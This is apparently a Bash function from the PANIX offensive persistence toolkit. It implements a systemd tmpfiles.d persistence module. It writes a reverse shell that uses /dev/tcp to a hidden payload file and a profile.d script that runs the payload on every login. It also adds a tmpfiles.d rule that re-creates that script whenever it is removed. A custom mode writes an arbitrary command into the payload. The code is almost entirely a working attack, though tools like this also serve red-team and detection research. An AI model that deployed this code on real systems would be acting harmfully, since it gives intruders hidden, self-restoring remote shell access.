setup_tmpfiles() {
	# systemd-tmpfiles.d persistence (issue #36).
	# Drops a payload file and a tmpfiles.d unit that re-creates it on every
	# boot / `systemd-tmpfiles --create` if the payload is deleted, giving the
	# attacker a self-healing persistence primitive.
	local payload_path=""
	local tmpfiles_path=""
	local conf_name=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local dest_path=""

	usage_tmpfiles() {
		echo "Usage: ./panix.sh --tmpfiles [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default tmpfiles settings"
		echo "  --ip <ip>                    Specify IP address for the reverse shell payload"
		echo "  --port <port>                Specify port number for the reverse shell payload"
		echo "  --payload <path>            Path to the payload file that tmpfiles.d will re-create (default: /usr/local/lib/.cache/.payload)"
		echo "  --dest <path>               Destination file re-created by tmpfiles.d (default: /etc/profile.d/panix-persist.sh)"
		echo "  --conf <name>               tmpfiles.d config name (default: panix-persist.conf)"
		echo "--custom                     Use custom tmpfiles settings"
		echo "  --payload <path>            Path to the payload file that tmpfiles.d will re-create"
		echo "  --dest <path>               Destination file re-created by tmpfiles.d"
		echo "  --conf <name>               tmpfiles.d config name"
		echo "  --command <command>         Custom persistence command written into the payload (no validation)"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--payload )
				shift
				payload_path=$1
				;;
			--dest )
				shift
				dest_path=$1
				;;
			--conf )
				shift
				conf_name=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --tmpfiles --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --tmpfiles --custom --payload /tmp/evil.sh --dest /etc/profile.d/panix-persist.sh --conf panix-persist.conf"
				exit 0
				;;
			--help|-h )
				usage_tmpfiles
				exit 0
				;;
			* )
				echo "Invalid option for --tmpfiles: $1"
				echo "Try './panix.sh --tmpfiles --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --tmpfiles --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --tmpfiles --help' for more information."
			exit 1
		fi

		if ! check_root; then
			echo "Error: --tmpfiles requires root privileges (writes to /etc/tmpfiles.d)."
			exit 1
		fi

		payload_path="${payload_path:-/usr/local/lib/.cache/.payload}"
		dest_path="${dest_path:-/etc/profile.d/panix-persist.sh}"
		conf_name="${conf_name:-panix-persist.conf}"

		# The payload re-created by tmpfiles.d: a reverse shell sourced from a
		# profile.d script so it triggers on any login shell.
		mkdir -p "$(dirname "$payload_path")"
		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" > "$payload_path"
		chmod 755 "$payload_path"

		# Destination file content (sourced by /etc/profile on login).
		echo "# PANIX tmpfiles.d persistence" > "$dest_path"
		echo "bash $payload_path" >> "$dest_path"
		chmod 644 "$dest_path"

		# tmpfiles.d rule: 'f' creates a regular file from the payload source
		# whenever it is missing (self-healing persistence).
		echo "f $dest_path 0644 root root - $payload_path" > "/etc/tmpfiles.d/$conf_name"
		systemd-tmpfiles --create "/etc/tmpfiles.d/$conf_name" 2>/dev/null || true
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $payload_path || -z $dest_path || -z $conf_name || -z $command ]]; then
			echo "Error: --payload, --dest, --conf and --command must be specified when using --custom."
			echo "Try './panix.sh --tmpfiles --help' for more information."
			exit 1
		fi

		if ! check_root; then
			echo "Error: --tmpfiles requires root privileges (writes to /etc/tmpfiles.d)."
			exit 1
		fi

		mkdir -p "$(dirname "$payload_path")"
		echo "$command" > "$payload_path"
		chmod 755 "$payload_path"

		echo "# PANIX tmpfiles.d persistence" > "$dest_path"
		echo "bash $payload_path" >> "$dest_path"
		chmod 644 "$dest_path"

		echo "f $dest_path 0644 root root - $payload_path" > "/etc/tmpfiles.d/$conf_name"
		systemd-tmpfiles --create "/etc/tmpfiles.d/$conf_name" 2>/dev/null || true
	else
		echo "Error: Either --default or --custom must be specified for --tmpfiles."
		echo "Try './panix.sh --tmpfiles --help' for more information."
		exit 1
	fi

	echo "[+] systemd-tmpfiles.d persistence established!"
}
